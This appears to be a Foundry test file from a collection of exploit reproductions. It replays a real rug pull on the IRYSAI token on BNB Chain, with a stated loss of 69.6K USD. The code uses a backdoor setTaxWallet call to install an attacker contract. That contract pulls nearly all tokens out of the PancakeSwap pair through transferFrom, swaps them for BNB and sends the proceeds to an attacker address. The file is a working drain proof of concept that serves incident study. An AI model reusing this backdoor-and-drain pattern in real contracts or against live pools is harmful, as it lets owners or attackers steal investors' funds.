pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 69.6K USD
// Attacker : 
// Attack Contract : 
// Vulnerable Contract : 
// Backdoor Tx : https://bscscan.com/tx/0x8c637fc98ad84b922e6301c0b697167963eee53bbdc19665f5d122ae55234ca6
// Rugpull Tx : https://bscscan.com/tx/0xe9a66bad8975f2a7b68c74992054c84d6d80ac4c543352e23bf23740b8858645

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1925012844052975776
// Twitter Guy : https://x.com/TenArmorAlert/status/1925012844052975776
// Hacking God : N/A

address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PancakeFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
address constant IRYSAI = 0x746727FC8212ED49510a2cB81ab0486Ee6954444;
address constant PancakePair = 0xeB703Ed8C1A3B1d7E8E29351A1fE5E625E2eFe04;
address constant addr1 = 0xc4cE1E4A8Cd2Ba980646e855817252C7AA9C4AE8;
address constant addr3 = 0x20bB82f7C5069c2588fa900eD438FEFD2Ae36827;

address constant addr2 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

interface IPancakeRouter02 {
    function factory() external view returns (address);
    function WETH() external view returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 49994891);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of addr3", address(addr3).balance, 18);
        vm.startPrank(addr1, addr1);
        addr3C attC = new addr3C();
        IIRYSAI(IRYSAI).setTaxWallet(address(attC));
        vm.startPrank(addr3, addr3);
        attC.burn();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of addr3", address(addr3).balance, 18);
    }
}

// 0x6233a81BbEcb355059DA9983D9fC9dFB86D7119f
contract addr3C {
    receive() external payable {}

    function burn() public {
        require(msg.sender == addr3, "only addr3");

        address factory = IPancakeRouter02(PancakeRouter).factory();
        address weth = IPancakeRouter02(PancakeRouter).WETH();
        address pair = IPancakeFactory(factory).getPair(IRYSAI, weth);
        uint256 balPair = IIRYSAI(IRYSAI).balanceOf(pair);

        uint256 amount = balPair - (balPair / 10000);
        IIRYSAI(IRYSAI).transferFrom(pair, address(this), amount);
        IPancakePair(pair).sync();
        uint256 balThis = IIRYSAI(IRYSAI).balanceOf(address(this));

        IERC20(IRYSAI).approve(PancakeRouter, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = IRYSAI;
        path[1] = addr2; // WBNB

        IPancakeRouter02(PancakeRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
            balThis,
            0,
            path,
            address(this),
            block.timestamp
        );

        (bool s, ) = payable(addr3).call{value: 107462996233504225783}("");
        require(s, "transfer failed");
    }
  
    fallback() external payable {}
}

interface IPancakeFactory {
	function getPair(address, address) external returns (address); 
}
interface IIRYSAI {
    function setTaxWallet(address) external;
	function transferFrom(address, address, uint256) external returns (bool);
	function balanceOf(address) external returns (uint256); 
}